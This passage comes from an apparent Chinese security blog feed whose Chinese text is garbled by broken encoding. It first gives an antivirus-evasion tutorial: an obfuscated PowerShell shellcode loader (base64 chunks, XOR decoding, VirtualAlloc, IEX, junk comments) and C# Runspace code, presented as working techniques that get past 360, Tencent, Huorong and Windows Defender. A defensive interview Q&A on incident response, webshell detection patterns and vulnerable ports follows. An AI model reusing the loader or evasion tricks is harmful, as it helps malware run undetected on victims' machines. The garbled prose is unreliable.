&#x27;Bbk1HWTJKemVCZC9jM2w3RmhjTGMzMEtGR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdGQycDFhbkYyY0E1M1puQjNEbVZxYjJZQ0Iyc0lhd2tqRm13Q2N3WmpZbk40RjM5emVYc1dGd3R6ZlFvVVlHQUtGRjRIWm1wZ1luRU9jSGRpYldkaWNXY09ZbTEzYW5WcWNYWndEbmRtY0hjT1pXcHZaZ0lIYXdockNTTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdZMkp6ZUJkL2MzbDdGaGNMYzMwS0ZDTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaE1ORWhNTkVoTU5FaElYSXlNakl5TT0nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZX&#x27;#fasdhnkjlh2iuhjdcb789gheh289hsko-0e22e</span><br><span class="line">#asdYyY0E1hd2tqRm13Q2N3Wes2mpZbk40RjM5emVYfadsraeawweaewjTGMzMEtG9rZShbSW50UHRyXTo6WmVybyR0JnQ2hSZUIyWnFZsadaR0p4RG5CM1ltMw23142W5ZbkZuRG1KdG9rZShbSW50UHRyXTo6WmVybyQycDFhbkYZlFvVVlHQ</span><br><span class="line">$1sdasfp24 = &#x27;RfZGVsZWdhdGVfdHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p&#x27;</span><br><span class="line">#asdYyY0E1hd2tqRm13Q2N3Wes2mpZbk40RjM5emVYc1dGd3R6w3RmhjTGMzMEtG9rZShbSW50UHRyXTo6WmVybyR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdG9rZShbSW50UHRyXTo6WmVybyQycDFhbkYZlFvVVlHQ</span><br><span class="line"></span><br><span class="line">$bbb= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a314fpda9+$psdaadsas+$213rdsaf3+$1sdasfp24))#JKemVCZC9jM2w3RmhjTGkkyTWpkRXQ3aDNERzNQYXdtaU00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaE1ORWhNTkVoTU5FaElYSXlNa)</span><br><span class="line">If ([IntPtr]::size -eq 8  ) &#123;#asdYyY0E1hd2tqRm13Q2N3Wes2mpZbk40RjM5emVYc1dGd3R6w3RmhjTGMzMEtG9rZShbSW50UHRyXTo6WmVybyR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdG9rZShbSW50UHRyXTo6WmVybyQycDFhbkYZlFvVVlHQ</span><br><span class="line">	start-job &#123; param($a) IEX $a &#125; -RunAs32 -Argument $bbb | wait-job | Receive-Job #dsasafaaffafaaffaasdsa31241412sdad231 rfdadsaf43gv213aat64zxcr</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	IEX $bbb  #asd22jnk43lhjsd9u23nkl#asdYyY0E1hd2tqRm13Q2N3Wes2mpZbk40RjM5emVYc1dGd3R6w3RmhjTGMzMEtG9ryXTo6WmVybyR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdG9rZShbSW50UHRyXTo6WmVybyQycDFhbkYZlFvVVlHQf89dy890w3epoi2j231r34ra</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/adb63639/28.png" alt="æˆªå›¾"></p>
<p>å¯ä»¥çœ‹åˆ°ä»15å‡åˆ°äº†5 æ·»åŠ åƒåœ¾æ³¨é‡Šè¿˜æ˜¯æœ‰æ•ˆæœçš„ ä½†æ˜¯è¢«amsiæ‹¦æˆªäº†  æ— æ³•ç»•è¿‡WinDef </p>
<p><img src="/posts/adb63639/nbpwdf.png"></p>
<p><a href="https://mp.weixin.qq.com/s/znyLqniUX_WXRizGV6TQlA">https://mp.weixin.qq.com/s/znyLqniUX_WXRizGV6TQlA</a></p>
<p>è¿™ç¯‡æ–‡ç« å°†psçš„payload éšæœºåˆ†æ®µ è¿™æ ·æ¯æ¬¡éƒ½ä¸ä¼šç›¸åŒ è€Œæ€è½¯æœ‰æ—¶ä¼šè®°å½•ç‰¹å¾ å›ºå®šçš„å‡ æ®µå¯èƒ½ä¼šå¤±æ•ˆï¼Œè€Œéšæœºåˆ‡ç‰‡åˆ†æ®µæ•ˆæœä¼šå¥½äº›</p>
<br>

<h3 id="C-è°ƒç”¨WINAPI"><a href="#C-è°ƒç”¨WINAPI" class="headerlink" title="C#è°ƒç”¨WINAPI"></a>C#è°ƒç”¨WINAPI</h3><p>é¡¹ç›®åœ°å€ <a href="https://github.com/INotGreen/nopowershell">https://github.com/INotGreen/nopowershell</a> <strong>æ„Ÿè°¢æ ¼æ—å¸ˆå‚…æä¾›çš„å…æ€æ–‡ç« </strong></p>
<p>åœ¨VSä¸­å¯¼å…¥C:\Program Files (x86)\Reference Assemblies\Microsoft\WindowsPowerShell\3.0 åˆ°é¡¹ç›®ä¸­</p>
<p>é€šè¿‡è°ƒç”¨windowsçš„APIå»æ‰§è¡Œpowershellå‘½ä»¤ ä»è€Œå»ç»•è¿‡360å¯¹powershellçš„ç¦ç”¨</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation.Runspaces;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">nopowershell</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Programe</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] psrevshell = Convert.FromBase64String(<span class="string">&quot;Y2FsYw==&quot;</span>); <span class="comment">//base64 ps1 shellcode</span></span><br><span class="line">            <span class="built_in">string</span> decodedString = Encoding.UTF8.GetString(psrevshell);</span><br><span class="line">            Runspace rs = RunspaceFactory.CreateRunspace();</span><br><span class="line">            rs.Open();</span><br><span class="line">            Pipeline pipeline = rs.CreatePipeline();</span><br><span class="line">            pipeline.Commands.AddScript(decodedString);</span><br><span class="line">            pipeline.Invoke();</span><br><span class="line">            rs.Close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p>ç¼–è¯‘å åŠ¨æ€é™æ€éƒ½å¯è¿‡360 è…¾è®¯ ç«ç»’ ä½†æ˜¯åœ¨è¿è¡Œåä¼šå‡ºç°ä¸€ä¸ªé»‘æ¡†ï¼Œéœ€è¦æ”¹ä¸€ä¸‹é¡¹ç›®(ä¿®æ”¹é¡¹ç›®çš„å±æ€§â€“&gt; è¾“å‡ºç±»å‹ æ”¹ä¸º Windowsåº”ç”¨ç¨‹åºå³å¯æ¶ˆé™¤é»‘æ¡†)</p>
<p><img src="/posts/adb63639/29.png"></p>
<p>è¿™ä¸ªä¹Ÿå¯ä»¥ç»•è¿‡WinDef</p>
<p><img src="/posts/adb63639/33.png"></p>
<br>

<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><strong>æ„Ÿè°¢æ ¼æ—å¤§ä½¬çš„æä¾›çš„å­¦ä¹ æ–‡ç« å’Œé¡¹ç›®</strong> Orz !!!</p>
<p><a href="https://github.com/INotGreen/nopowershell">https://github.com/INotGreen/nopowershell</a></p>
<p><a href="https://blog.csdn.net/Hungchuiho/article/details/121436429">https://blog.csdn.net/Hungchuiho/article/details/121436429</a></p>
<p><a href="https://mamor5409.github.io/posts/359bf983/">https://mamor5409.github.io/posts/359bf983/</a></p>
<p><a href="https://mp.weixin.qq.com/s/znyLqniUX_WXRizGV6TQlA">https://mp.weixin.qq.com/s/znyLqniUX_WXRizGV6TQlA</a></p>
]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>æ•´ç†çš„éƒ¨åˆ†é¢è¯•é¢˜åŠç­”æ¡ˆ</title>
    <url>/posts/884863d2/</url>
    <content><![CDATA[<h3 id="åº”æ€¥å“åº”åŸºæœ¬æ€è·¯æµç¨‹"><a href="#åº”æ€¥å“åº”åŸºæœ¬æ€è·¯æµç¨‹" class="headerlink" title="åº”æ€¥å“åº”åŸºæœ¬æ€è·¯æµç¨‹"></a>åº”æ€¥å“åº”åŸºæœ¬æ€è·¯æµç¨‹</h3><p>  1.æ”¶é›†ä¿¡æ¯  æ”¶é›†å®¢æˆ·ä¿¡æ¯å’Œä¸­æ¯’ä¸»æœºä¿¡æ¯ åŒ…æ‹¬æ ·æœ¬<br>  2.åˆ¤æ–­ç±»å‹  åˆ¤æ–­æ˜¯ä½•ç§å®‰å…¨äº‹ä»¶ï¼ˆæŒ–çŸ¿ã€å‹’ç´¢ã€Dosã€æ–­ç½‘ç­‰ï¼‰<br>  3.æŠ‘åˆ¶èŒƒå›´  éš”ç¦»ï¼Œä½¿å—å®³é¢ä¸ç»§ç»­æ‰©å¤§<br>  4.æ·±å…¥åˆ†æ  æ—¥å¿—åˆ†æã€è¿›ç¨‹åˆ†æã€å¯åŠ¨é¡¹åˆ†æã€æ ·æœ¬åˆ†æ<br>  5.æ¸…ç†å¤„ç½®  æ€æ‰è¿›ç¨‹ã€æ‰“è¡¥ä¸ã€åˆ æ–‡ä»¶ã€åˆ é™¤åé—¨ã€åˆ é™¤å¼‚å¸¸å¯åŠ¨æœåŠ¡<br>  6.äº§å‡ºæŠ¥å‘Š  æ•´ç†è¾“å‡ºå®Œæ•´çš„å®‰å…¨äº‹ä»¶æŠ¥å‘Š</p>
<h3 id="Windowså…¥ä¾µæ’æŸ¥æ€è·¯"><a href="#Windowså…¥ä¾µæ’æŸ¥æ€è·¯" class="headerlink" title="Windowså…¥ä¾µæ’æŸ¥æ€è·¯"></a>Windowså…¥ä¾µæ’æŸ¥æ€è·¯</h3><p>  1.æ£€æŸ¥ç³»ç»Ÿè´¦å·å®‰å…¨<br>    &lt;1&gt;æ˜¯å¦æœ‰å¼±å£ä»¤ è¿æ¥å¯¹å¤–å¼€å‘çš„ç«¯å£ï¼ˆå¯ä»¥ç”¨netstat -ano æŸ¥çœ‹ï¼‰<br>    &lt;2&gt; lusrmgr.msc æŸ¥çœ‹æœåŠ¡å™¨æ˜¯å¦å­˜åœ¨å¯ç–‘è´¦å·ã€æ–°å¢è´¦å·<br>    &lt;3&gt;é€šè¿‡Dç›¾æˆ–è€…æ³¨å†Œè¡¨æŸ¥çœ‹æœåŠ¡å™¨æ˜¯å¦å­˜åœ¨éšè—è´¦å·æˆ–å…‹éš†è´¦å·<br>    &lt;4&gt;ç»“åˆæ—¥å¿—æŸ¥çœ‹ç®¡ç†å‘˜ç™»å½•äº‹ä»¶ã€ç”¨æˆ·åæ˜¯å¦æ­£å¸¸ï¼ˆeventvwr.mscæ‰“å¼€äº‹ä»¶æŸ¥çœ‹å™¨ï¼Œå¯¼å‡ºåä½¿ç”¨LogPareråˆ†æï¼‰</p>
<p>  2.æ£€æŸ¥å¼‚å¸¸ç«¯å£ã€è¿›ç¨‹<br>    netstat -ano æ£€æŸ¥ç«¯å£è¿æ¥æƒ…å†µ<br>    ä½¿ç”¨ä»»åŠ¡ç®¡ç†å™¨æˆ–è€… process exp/processmon ç­‰æŸ¥çœ‹è¿›ç¨‹<br>  3.æ£€æŸ¥å¯åŠ¨é¡¹ã€è®¡åˆ’ä»»åŠ¡ã€æœåŠ¡</p>
<p>  4.æ£€æŸ¥ç³»ç»Ÿç›¸å…³ä¿¡æ¯ã€ç‰ˆæœ¬ã€è¡¥ä¸<br>    systeminfo<br>  5.æŸ¥æ‰¾å¯ç–‘ç›®å½•åŠæ–‡ä»¶<br>    å¯ä»¥é€šè¿‡ %UserProfile%\Recent æŸ¥çœ‹æœ€è¿‘è®¿é—®ï¼ŒæŸ¥çœ‹æµè§ˆå™¨ä¸‹è½½ç›®å½•/å†å²è®°å½•/ä¿®æ”¹æ–‡ä»¶çš„æ—¶é—´<br>  6.æ—¥å¿—åˆ†æ<br>    eventvwr.msc å¯¼å‡ºåˆ°LogParser</p>
<p>Linuxå…¥ä¾µæ’æŸ¥æ€è·¯<br>  &lt;1&gt; è´¦å·å®‰å…¨<br>    who æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·ï¼ˆttyæœ¬åœ°ç™»é™† ptsè¿œç¨‹ç™»å½•ï¼‰<br>    w   æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œæƒ³çŸ¥é“æŸä¸€æ—¶åˆ»ç”¨æˆ·çš„è¡Œä¸º<br>    cat /etc/passwd ç”¨æˆ·ä¿¡æ¯æ–‡ä»¶<br>      root:x:0:0:root:/root:/bin/bash<br>      account:password:UID:GID:GECOS:directory:shell<br>      ç”¨æˆ·åï¼šå¯†ç ï¼šç”¨æˆ·IDï¼šç»„IDï¼šç”¨æˆ·è¯´æ˜ï¼šå®¶ç›®å½•ï¼šç™»é™†ä¹‹åshell<br>      æ³¨æ„ï¼šæ— å¯†ç åªå…è®¸æœ¬æœºç™»é™†ï¼Œè¿œç¨‹ä¸å…è®¸ç™»é™†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd å­˜å‚¨ä¸€èˆ¬çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä»»ä½•äººéƒ½å¯ä»¥è®¿é—®ï¼›</span><br><span class="line">/etc/shadow å­˜å‚¨ç”¨æˆ·çš„å¯†ç ä¿¡æ¯ï¼Œåªæœ‰ root ç”¨æˆ·å¯ä»¥è®¿é—®</span><br><span class="line"></span><br><span class="line">cat /etc/shadow å½±å­æ–‡ä»¶</span><br><span class="line">  root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>ç”¨æˆ·åï¼šåŠ å¯†å¯†ç ï¼šå¯†ç æœ€åä¸€æ¬¡ä¿®æ”¹æ—¥æœŸï¼šä¸¤æ¬¡å¯†ç çš„ä¿®æ”¹æ—¶é—´é—´éš”ï¼šå¯†ç æœ‰æ•ˆæœŸï¼šå¯†ç ä¿®æ”¹åˆ°æœŸåˆ°çš„è­¦å‘Šå¤©æ•°ï¼šå¯†ç è¿‡æœŸä¹‹åçš„å®½é™å¤©æ•°ï¼šè´¦å·å¤±æ•ˆæ—¶é—´ï¼šä¿ç•™</p>
<p>  &lt;2&gt; å†å²å‘½ä»¤<br>      é€šè¿‡ .bash_history æŸ¥çœ‹å¸å·æ‰§è¡Œè¿‡çš„ç³»ç»Ÿå‘½ä»¤<br>      1ã€rootçš„å†å²å‘½ä»¤ histroy<br>      2ã€æ‰“å¼€ /home å„å¸å·ç›®å½•ä¸‹çš„ .bash_historyï¼ŒæŸ¥çœ‹æ™®é€šå¸å·çš„å†å²å‘½ä»¤<br>      <code>history -c</code> æ¸…é™¤å†å²æ“ä½œå‘½ä»¤(ä½†æ­¤å‘½ä»¤å¹¶ä¸ä¼šæ¸…é™¤ä¿å­˜åœ¨æ–‡ä»¶ä¸­çš„è®°å½•ï¼Œéœ€è¦æ‰‹åŠ¨åˆ é™¤.bash_profileæ–‡ä»¶ä¸­çš„è®°å½•)</p>
<p>  &lt;3&gt; æ£€æŸ¥å¼‚å¸¸ç«¯å£<br>    <code>netstat -antlp|more</code><br>    æŸ¥çœ‹ä¸‹pidæ‰€å¯¹åº”çš„è¿›ç¨‹æ–‡ä»¶è·¯å¾„ï¼Œ<br>    è¿è¡Œ<code>ls -l /proc/$PID/exeæˆ–file /proc/$PID/exe</code>ï¼ˆ$PID ä¸ºå¯¹åº”çš„pid å·ï¼‰</p>
<p>  &lt;4&gt; æ£€æŸ¥å¼‚å¸¸è¿›ç¨‹<br>   <code> ps aux | grep pid</code></p>
<p>  &lt;5&gt; æ£€æµ‹å¼€æœºå¯åŠ¨é¡¹<br>  <code> /etc/rc.local</code><br>    <code>/etc/rc.d/rc[0~6].d</code></p>
<p>  &lt;6&gt; æ£€æŸ¥å®šæ—¶ä»»åŠ¡<br>   <code>crontab -l</code>åˆ—å‡ºæŸä¸ªç”¨æˆ·cronæœåŠ¡çš„è¯¦ç»†å†…å®¹<br>    Tipsï¼šé»˜è®¤ç¼–å†™çš„crontabæ–‡ä»¶ä¼šä¿å­˜åœ¨ (/var/spool/cron/ç”¨æˆ·å ä¾‹å¦‚: /var/spool/cron/root<br>   <code>crontab -r </code>åˆ é™¤æ¯ä¸ªç”¨æˆ·crontä»»åŠ¡(è°¨æ…ï¼šåˆ é™¤æ‰€æœ‰çš„è®¡åˆ’ä»»åŠ¡)<br>    <code>crontab -e</code> ä½¿ç”¨ç¼–è¾‘å™¨ç¼–è¾‘å½“å‰çš„crontabæ–‡ä»¶<br>    å¦‚ï¼š*/1 * * * * echo â€œhello worldâ€ &gt;&gt; /tmp/test.txt æ¯åˆ†é’Ÿå†™å…¥æ–‡ä»¶</p>
<p>  &lt;7&gt; æ£€æŸ¥æœåŠ¡<br>    <code>chkconfig --list</code> å‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹ç³»ç»Ÿè¿è¡Œçš„æœåŠ¡</p>
<h3 id="æ¡†æ¶æ¼æ´-amp-å¸¸è§å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Ÿ"><a href="#æ¡†æ¶æ¼æ´-amp-å¸¸è§å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Ÿ" class="headerlink" title="æ¡†æ¶æ¼æ´&amp;å¸¸è§å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Ÿ"></a>æ¡†æ¶æ¼æ´&amp;å¸¸è§å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Ÿ</h3><p>  &lt;1&gt;Struts2 OGNLæ³¨å…¥<br>  &lt;2&gt;weblogic<br>  &lt;3&gt;fastjson<br>  &lt;4&gt;TP5 RCE<br>  â€¦â€¦</p>
<h3 id="å¸¸è§å®‰å…¨å·¥å…·ã€è®¾å¤‡"><a href="#å¸¸è§å®‰å…¨å·¥å…·ã€è®¾å¤‡" class="headerlink" title="å¸¸è§å®‰å…¨å·¥å…·ã€è®¾å¤‡"></a>å¸¸è§å®‰å…¨å·¥å…·ã€è®¾å¤‡</h3><p>  å·¥å…· nmap wireshark Burpsuite Awvs Oneforall CS MSF behind antsword<br>  è®¾å¤‡ ï¼Ÿï¼Ÿï¼Ÿ æ²¡æ¥è§¦è¿‡</p>
<h3 id="DDOS-CCåº”æ€¥æ€è·¯ä»¥åŠå¦‚ä½•é˜²èŒƒ"><a href="#DDOS-CCåº”æ€¥æ€è·¯ä»¥åŠå¦‚ä½•é˜²èŒƒ" class="headerlink" title="DDOS CCåº”æ€¥æ€è·¯ä»¥åŠå¦‚ä½•é˜²èŒƒ"></a>DDOS CCåº”æ€¥æ€è·¯ä»¥åŠå¦‚ä½•é˜²èŒƒ</h3><p>  å¢åŠ ç¡¬ä»¶è®¾å¤‡<br>  ä¸Šäº‘<br>  è´­ä¹°ä¸“ä¸šå®‰å…¨å…¬å¸çš„å®‰å…¨æœåŠ¡<br>  éšè—æœåŠ¡å™¨çš„çœŸå® IPã€ä¸Šäº‘ WAFã€CDNã€ è´Ÿè½½å‡è¡¡ç­‰è®¾å¤‡<br>  è¿‡æ»¤ä¸å¿…è¦çš„æœåŠ¡ç«¯å£<br>  ä½¿ç”¨ç¡¬ä»¶é˜²ç«å¢™<br>  é™åˆ¶ç‰¹å®šæµé‡</p>
<h3 id="æœåŠ¡å™¨å­˜åœ¨webshellï¼Œå¦‚ä½•å¤„ç†ï¼Ÿ"><a href="#æœåŠ¡å™¨å­˜åœ¨webshellï¼Œå¦‚ä½•å¤„ç†ï¼Ÿ" class="headerlink" title="æœåŠ¡å™¨å­˜åœ¨webshellï¼Œå¦‚ä½•å¤„ç†ï¼Ÿ"></a>æœåŠ¡å™¨å­˜åœ¨webshellï¼Œå¦‚ä½•å¤„ç†ï¼Ÿ</h3><p>  1.ä½¿ç”¨Dç›¾æˆ–è€…æ²³é©¬(æ”¯æŒå¤šå¹³å°ï¼Œä½†éœ€è¦è”ç½‘)è¿›è¡ŒæŸ¥æ€<br>  2.äº‹ä»¶åˆ†æ åˆ†æåˆ›å»ºæ—¶é—´ç‚¹çš„æ—¥å¿—<br>  3.æ¼æ´åˆ†æ è¿›ç¨‹åˆ†æ æ ·æœ¬åˆ†æ<br>  4.æ¼æ´å¤ç°<br>  5.æ¼æ´ä¿®å¤  æ¸…é™¤webshellå’Œæ®‹ç•™æ–‡ä»¶ï¼›é…ç½®å¿…è¦çš„é˜²ç«å¢™å¹¶å¼€å¯é˜²ç«å¢™ç­–ç•¥ï¼›é˜²æ­¢æš´éœ²ä¸å¿…è¦çš„æœåŠ¡ï¼›æ’æŸ¥ç¨‹åºå­˜åœ¨çš„æ¼æ´å¹¶åŠæ—¶ä¿®è¡¥</p>
<h3 id="æ’æŸ¥shell-åº”è¯¥ç”¨ä»€ä¹ˆå‘½ä»¤æ¥è¿›è¡Œæ’æŸ¥"><a href="#æ’æŸ¥shell-åº”è¯¥ç”¨ä»€ä¹ˆå‘½ä»¤æ¥è¿›è¡Œæ’æŸ¥" class="headerlink" title="æ’æŸ¥shell åº”è¯¥ç”¨ä»€ä¹ˆå‘½ä»¤æ¥è¿›è¡Œæ’æŸ¥"></a>æ’æŸ¥shell åº”è¯¥ç”¨ä»€ä¹ˆå‘½ä»¤æ¥è¿›è¡Œæ’æŸ¥</h3><p>  find<br>  <code>find /var/www/html -name &quot;*.php&quot; |xargs egrep &#39;assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\(&#39;</code></p>
<h3 id="å¦‚ä½•æ£€æµ‹webshell"><a href="#å¦‚ä½•æ£€æµ‹webshell" class="headerlink" title="å¦‚ä½•æ£€æµ‹webshell"></a>å¦‚ä½•æ£€æµ‹webshell</h3><p>  &lt;1&gt; ä¸»æœºå±‚é¢<br>  é™æ€æ£€æŸ¥(ç‰¹å¾ç ã€å±é™©å‡½æ•°)ã€åŠ¨æ€æ£€æŸ¥ã€æ—¥å¿—æ£€æµ‹<br>  &lt;2&gt; æµé‡å±‚é¢<br>  webshellæµé‡ç‰¹å¾</p>
<h3 id="Webshellç®¡ç†å·¥å…·çš„æµé‡ç‰¹å¾"><a href="#Webshellç®¡ç†å·¥å…·çš„æµé‡ç‰¹å¾" class="headerlink" title="Webshellç®¡ç†å·¥å…·çš„æµé‡ç‰¹å¾"></a>Webshellç®¡ç†å·¥å…·çš„æµé‡ç‰¹å¾</h3><p>  &lt;1&gt;èœåˆ€<br>    åªä½¿ç”¨urlç¼–ç +base64ç¼–ç <br>    shell ç‰¹å¾å°±æ˜¯ä¼ è¾“å‚æ•°åä¸º z0ï¼Œè¿˜å­˜åœ¨int_set(â€œdisplay_errosâ€,â€0â€)å­—ç¬¦ä¸²ç‰¹å¾<br>  &lt;2&gt;èšå‰‘<br>    é»˜è®¤çš„èšå‰‘shellè¿æ¥æ—¶ä¼šè¯·æ±‚ä¸¤æ¬¡ï¼Œå…¶è¯·æ±‚ä½“ç»è¿‡urlç¼–ç <br>    ç¬¬ä¸€æ¬¡è¯·æ±‚  å…³é—­æŠ¥é”™å’Œ magic_qoutes ç„¶åå»è·å–ä¸»æœºä¿¡æ¯<br>    ç¬¬äºŒæ¬¡è¯·æ±‚  åˆ—å‡ºä¸»æœºç›®å½•<br>  &lt;3&gt;å†°è2.0<br>    ä½¿ç”¨AESåŠ å¯†å‘é€3æ¬¡è¯·æ±‚<br>    ç¬¬ä¸€æ¬¡è¯·æ±‚  æœåŠ¡ç«¯äº§ç”Ÿå¯†é’¥å†™å…¥sessionï¼Œ sessionå’Œå½“å‰ä¼šè¯ç»‘å®šï¼Œä¸åŒå®¢æˆ·ç«¯çš„å¯†é’¥ä¹Ÿä¸åŒ<br>    ç¬¬äºŒæ¬¡è¯·æ±‚  è·å– key<br>    ç¬¬ä¸‰æ¬¡è¯·æ±‚  ä½¿ç”¨ keyçš„AESåŠ å¯†è¿›è¡Œé€šä¿¡<br>  &lt;4&gt;å†°è3.0<br>    ä½¿ç”¨AESåŠ å¯†å‘èµ·2æ¬¡è¯·æ±‚<br>    ä¸2.0ç›¸æ¯” å°‘äº†åŠ¨æ€å¯†é’¥è·å–çš„è¯·æ±‚ï¼Œä¸å†ä½¿ç”¨éšæœºç”Ÿæˆçš„keyï¼Œæ”¹ä¸ºå–è¿æ¥å¯†ç madï¼‹saltçš„å‰16ä¸ºä½œä¸ºå¯†é’¥<br>    ç¬¬ä¸€æ¬¡è¯·æ±‚  åˆ¤æ–­æ˜¯å¦å¯ä»¥å»ºç«‹è¿æ¥<br>    ç¬¬äºŒæ¬¡è¯·æ±‚  å‘é€phpinfoç­‰ä»£ç æ‰§è¡Œï¼Œè·å–ç½‘ç«™ä¿¡æ¯<br>  &lt;5&gt;å“¥æ–¯æ‹‰<br>    æ”¯æŒ n ç§åŠ å¯†<br>    é‡‡ç”¨äº†å’Œå†°è 3.0 ä¸€æ ·çš„å¯†é’¥äº¤æ¢æ–¹å¼ï¼Œå“¥æ–¯æ‹‰å»ºç«‹è¿æ¥æ—¶ä¼šå‘èµ·ä¸‰æ¬¡è¯·æ±‚<br>    ç¬¬ä¸€æ¬¡è¯·æ±‚  æ•°æ®è¶…çº§é•¿ï¼Œå»ºç«‹ session<br>    ç¬¬äºŒä¸‰æ¬¡è¯·æ±‚ç¡®è®¤è¿æ¥</p>
<h3 id="å¸¸è§ç«¯å£æ¼æ´"><a href="#å¸¸è§ç«¯å£æ¼æ´" class="headerlink" title="å¸¸è§ç«¯å£æ¼æ´"></a>å¸¸è§ç«¯å£æ¼æ´</h3><p>  &lt;1&gt;è¿œç¨‹ç®¡ç†ç«¯å£<br>    22ssh(å¼±å£ä»¤ã€æš´åŠ›ç ´è§£) 23Telnet(å¼±å£ä»¤ã€æ˜æ–‡ä¼ è¾“) 3389RDP(æš´åŠ›ç ´è§£)<br>  &lt;2&gt;Webä¸­é—´ä»¶/æœåŠ¡ç«¯å£<br>    1090/1099 RMI     (JAVAååºåˆ—åŒ–è¿œç¨‹RCE)<br>    7001 Weblogic     (å¼±å£ä»¤ã€SSRFã€ååºåˆ—åŒ–)<br>    8080 Tomcat       (å¼±å£ä»¤)<br>    8080 Jenkin       (æœªæˆæƒè®¿é—®ã€å‘½ä»¤æ‰§è¡Œ)<br>    9043 WebSphere    (æ§åˆ¶å°å¼±å£ä»¤ã€è¿œç¨‹ä»£ç æ‰§è¡Œ)<br>    50070 Hadoop      (æœªæˆæƒè®¿é—®)<br>  &lt;3&gt;æ•°æ®åº“ç«¯å£<br>    389 Ldap    (å¼±å£ä»¤ã€æœªæˆæƒèŒƒå›´) ä½¿ç”¨LdapBrowerå·¥å…·ç›´æ¥ç‚¼ä¹³<br>    1433 Mssql  (å¼±å£ä»¤ã€æš´åŠ›ç ´è§£)<br>    1521 Oracle (å¼±å£ä»¤ã€æš´åŠ›ç ´è§£)<br>    3306 Mysql  (å¼±å£ä»¤ã€æš´åŠ›ç ´è§£) åˆ©ç”¨æ—¥å¿—å†™å…¥webshellã€udfææƒã€mofææƒç­‰<br>    5432 PostgreSQL (å¼±å£ä»¤ã€é«˜æƒé™å‘½ä»¤æ‰§è¡Œ)<br>    6379 Redis  (æœªæˆæƒè®¿é—®)<br>    27017 Mongodb   (æœªæˆæƒè®¿é—®ã€å¼±å£ä»¤)</p>
